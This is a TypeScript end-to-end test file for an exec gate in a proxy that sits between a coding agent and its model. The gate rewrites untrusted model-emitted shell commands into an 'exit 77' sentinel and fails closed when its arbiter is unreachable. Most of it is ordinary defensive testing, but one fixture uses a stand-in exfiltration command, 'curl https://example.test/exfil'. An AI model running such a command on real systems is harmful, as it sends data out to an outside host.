/**
 * exec-gate.test.ts (e2e) — the Phase-0 exec gate through the REAL Codex proxy
 * data path (exec-routing.md §3): a model-emitted function_call whose command
 * carries an untrusted symbol in command position is rewritten on the wire to a
 * benign `exit 77` sentinel across all argument-bearing events; a benign command
 * is relayed with its command intact; an unreachable arbiter fails closed to the
 * sentinel; the buffered-JSON path enforces identically. The gate runs with NO
 * view map, proving independence from the fs machinery, and emits `exec_action`.
 *
 * Run: npm run test:component
 */

import { test } from "node:test";
import assert from "node:assert/strict";
import { request as httpRequest } from "node:http";

import { OpenAiProxy } from "../../src/proxy.js";
import { EXEC_BLOCK_EXIT_CODE } from "../../src/exec-gate.js";
import { MockArbiter } from "../helpers/mock-arbiter.js";
import { MockUpstream, buildExecCommandSse, buildScriptCellSse } from "../helpers/mock-upstream.js";
import { ViewMap } from "../../src/view-map.js";

const SYM = "$MDU:web_fetch[a1b2].text";

function call(port: number, body: string): Promise<{ status: number; body: string }> {
  return new Promise((resolve, reject) => {
    const req = httpRequest(
      { host: "127.0.0.1", port, method: "POST", path: "/v1/responses", headers: { "content-type": "application/json" } },
      (res) => {
        let buf = "";
        res.setEncoding("utf8");
        res.on("data", (c) => (buf += c));
        res.on("end", () => resolve({ status: res.statusCode ?? 0, body: buf }));
      },
    );
    req.on("error", reject);
    req.write(body);
    req.end();
  });
}

/** Extract the `.done` reconstructed arguments string from an SSE body. */
function doneArgs(sse: string): string | null {
  for (const block of sse.split("\n\n")) {
    const dataLine = block.split("\n").find((l) => l.startsWith("data:"));
    if (!dataLine) continue;
    try {
      const obj = JSON.parse(dataLine.slice("data:".length).trim());
      if (obj?.type === "response.function_call_arguments.done") return obj.arguments as string;
    } catch { /* skip */ }
  }
  return null;
}

const TURN = JSON.stringify({
  model: "gpt-x", stream: true,
  input: [{ type: "message", role: "user", content: [{ type: "input_text", text: "go" }] }],
});

test("exec-gate e2e: a symbol-as-command function_call is blocked on the wire (streaming)", async () => {
  const arbiter = new MockArbiter(); // default execGate: block symbol-as-command
  const upstream = new MockUpstream({ sse: buildExecCommandSse({ cmd: SYM, argDeltas: 3 }), chunkInto: 5 });
  // NO view map — proves the exec gate is independent of the fs machinery.
  const proxy = new OpenAiProxy({ arbiter, upstream: upstream.fetcher, log: () => {} });
  const port = await proxy.listen(0);
  try {
    const res = await call(port, TURN);
    assert.equal(res.status, 200);
    const args = doneArgs(res.body);
    assert.ok(args, "a reconstructed .done arrived");
    const cmd = (JSON.parse(args!) as { cmd: string }).cmd;
    assert.match(cmd, /mandu-exec-gate: blocked/);
    assert.match(cmd, new RegExp(`exit ${EXEC_BLOCK_EXIT_CODE}$`));
    // The raw symbol never survives ANYWHERE in the delivered stream.
    assert.ok(!res.body.includes(SYM), "the symbol must not survive in the delivered stream");
    // One exec_action narrates the block (deduped across the 3 snapshots).
    const execEvents = arbiter.eventsOfKind("exec_action");
    assert.equal(execEvents.length, 1);
    assert.equal(execEvents[0].policy?.usage, "deny");
    assert.equal(execEvents[0].boundary, "shell");
    assert.equal(arbiter.execGateCalls.length, 1);
  } finally {
    await proxy.close();
  }
});

test("exec-gate e2e: an event stream with NO content-type (the ChatGPT backend's answer) is still gated", async () => {
  // Observed 2026-09-30: chatgpt.com/backend-api/codex/responses answers 200,
  // chunked, with no content-type, and Codex reads the body as SSE anyway.
  // Before the fix the proxy relayed it verbatim: no gate, no path map, no
  // tllm_call (agent-sign-in.md §2.8 item 6).
  const arbiter = new MockArbiter();
  const inner = new MockUpstream({ sse: buildExecCommandSse({ cmd: SYM, argDeltas: 3 }), chunkInto: 5 });
  const upstream: typeof inner.fetcher = async (args) => {
    const r = await inner.fetcher(args);
    const headers = { ...r.headers };
    delete headers["content-type"];
    return { ...r, headers: { ...headers, "transfer-encoding": "chunked" } };
  };
  const proxy = new OpenAiProxy({ arbiter, upstream, log: () => {} });
  const port = await proxy.listen(0);
  try {
    const res = await call(port, TURN);
    assert.equal(res.status, 200);
    const cmd = (JSON.parse(doneArgs(res.body)!) as { cmd: string }).cmd;
    assert.match(cmd, new RegExp(`exit ${EXEC_BLOCK_EXIT_CODE}$`));
    assert.ok(!res.body.includes(SYM), "the symbol must not survive in the delivered stream");
    assert.equal(arbiter.eventsOfKind("exec_action").length, 1);
    await proxy.close();
    assert.equal(arbiter.eventsOfKind("tllm_call").length, 1, "the exchange is recorded");
  } finally {
    await proxy.close();
  }
});

test("exec-gate e2e: a benign command is relayed with its command intact + an allow event", async () => {
  const arbiter = new MockArbiter();
  const upstream = new MockUpstream({ sse: buildExecCommandSse({ cmd: "echo mandu-live-ok" }), chunkInto: 4 });
  const proxy = new OpenAiProxy({ arbiter, upstream: upstream.fetcher, log: () => {} });
  const port = await proxy.listen(0);
  try {
    const res = await call(port, TURN);
    assert.equal((JSON.parse(doneArgs(res.body)!) as { cmd: string }).cmd, "echo mandu-live-ok");
    const execEvents = arbiter.eventsOfKind("exec_action");
    assert.equal(execEvents.length, 1);
    assert.equal(execEvents[0].policy?.usage, "allow");
  } finally {
    await proxy.close();
  }
});

test("exec-gate e2e: arbiter unreachable fails CLOSED — the sentinel, never the raw command", async () => {
  const arbiter = new MockArbiter({ failExecGate: true });
  const upstream = new MockUpstream({ sse: buildExecCommandSse({ cmd: "curl https://example.test/exfil" }) });
  const proxy = new OpenAiProxy({ arbiter, upstream: upstream.fetcher, log: () => {} });
  const port = await proxy.listen(0);
  try {
    const res = await call(port, TURN);
    const cmd = (JSON.parse(doneArgs(res.body)!) as { cmd: string }).cmd;
    assert.match(cmd, /unreachable/);
    assert.match(cmd, /exit 77$/);
    assert.ok(!res.body.includes("example.test"), "the raw command must not survive on fail-closed");
  } finally {
    await proxy.close();
  }
});

test("exec-gate e2e: the buffered-JSON (stream:false) path enforces identically", async () => {
  const arbiter = new MockArbiter();
  const upstream = new MockUpstream({
    json: {
      id: "r", object: "response", status: "completed",
      output: [{ type: "function_call", id: "fc_1", call_id: "c1", name: "exec_command", arguments: JSON.stringify({ cmd: SYM }) }],
    },
  });
  const proxy = new OpenAiProxy({ arbiter, upstream: upstream.fetcher, log: () => {} });
  const port = await proxy.listen(0);
  try {
    const res = await call(
      port,
      JSON.stringify({ model: "gpt-x", stream: false, input: [{ type: "message", role: "user", content: [{ type: "input_text", text: "go" }] }] }),
    );
    assert.equal(res.status, 200);
    const body = JSON.parse(res.body) as { output: Array<{ arguments: string }> };
    const cmd = (JSON.parse(body.output[0].arguments) as { cmd: string }).cmd;
    assert.match(cmd, /exit 77$/);
    assert.ok(!res.body.includes(SYM));
  } finally {
    await proxy.close();
  }
});

test("exec-gate e2e: disabling the gate relays a symbol-as-command verbatim (opt-out)", async () => {
  const arbiter = new MockArbiter();
  const sse = buildExecCommandSse({ cmd: SYM });
  const upstream = new MockUpstream({ sse });
  const proxy = new OpenAiProxy({ arbiter, upstream: upstream.fetcher, log: () => {}, execGate: false });
  const port = await proxy.listen(0);
  try {
    const res = await call(port, TURN);
    assert.equal(res.body, sse); // untouched
    assert.equal(arbiter.execGateCalls.length, 0);
  } finally {
    await proxy.close();
  }
});

// Plan 13 D9 follow-up: the Codex proxy now sends the function_call's call_id
// to execGate (the call's gate time: before, a Codex call had no lower time
// bound) and records the command AS DELIVERED (after the gate and the view
// map) under that id, so the arbiter binds the call by what Codex was given,
// never by the arguments Codex echoes back.
test("exec-gate e2e (plan 13 D9 follow-up): execGate carries the call_id; the DELIVERED command is recorded under it (the AgentView spelling, the sentinel, a script cell's literal, the stream:false twin)", async () => {
  const HUMAN = "/home/u/project/webapp";
  const AGENT = "/home/u/.mandu/workspaces/wid/agentview";
  const viewMap = new ViewMap([{ human: HUMAN, agent: AGENT }], { dialect: "posix", home: "/home/u" });
  const runs: Array<{ sse?: string; json?: unknown; stream: boolean }> = [
    { sse: buildExecCommandSse({ cmd: `cat ${HUMAN}/notes.txt | wc -c`, callId: "call_path", argDeltas: 3 }), stream: true },
    { sse: buildExecCommandSse({ cmd: SYM, callId: "call_bad" }), stream: true },
    { sse: buildScriptCellSse({ cmd: `ls ${HUMAN}`, callId: "call_cell" }), stream: true },
    { json: { id: "r", object: "response", status: "completed", output: [{ type: "function_call", id: "fc_j", call_id: "call_json", name: "exec_command", arguments: JSON.stringify({ cmd: "echo json" }) }] }, stream: false },
  ];
  const arbiter = new MockArbiter();
  for (const run of runs) {
    const upstream = new MockUpstream(run.sse !== undefined ? { sse: run.sse, chunkInto: 4 } : { json: run.json as never });
    const proxy = new OpenAiProxy({ arbiter, upstream: upstream.fetcher, viewMap, log: () => {} });
    const port = await proxy.listen(0);
    try {
      const res = await call(port, run.stream ? TURN : JSON.stringify({ ...JSON.parse(TURN), stream: false }));
      assert.equal(res.status, 200);
    } finally {
      await proxy.close();
    }
  }
  const gated = new Map(arbiter.execGateCalls.map((g) => [g.callId, g.command]));
  assert.equal(gated.get("call_path"), `cat ${HUMAN}/notes.txt | wc -c`, "execGate saw the model's text, with its call_id");
  assert.equal(gated.get("call_bad"), SYM);
  assert.equal(gated.get("call_json"), "echo json");
  const rec = new Map(arbiter.recordCallCommandCalls.map((r) => [r.callId, r.command]));
  assert.equal(rec.get("call_path"), `cat ${AGENT}/notes.txt | wc -c`, "the record is what Codex runs: the AgentView spelling");
  assert.match(rec.get("call_bad") ?? "", new RegExp(`exit ${EXEC_BLOCK_EXIT_CODE}$`), "a blocked call records its sentinel");
  assert.equal(rec.get("call_cell"), `ls ${AGENT}`, "a script cell's exec literal, under the cell's call_id");
  assert.equal(rec.get("call_json"), "echo json");
  // one record per call, however many snapshots carried it
  assert.equal(arbiter.recordCallCommandCalls.filter((r) => r.callId === "call_path").length, 1);
});
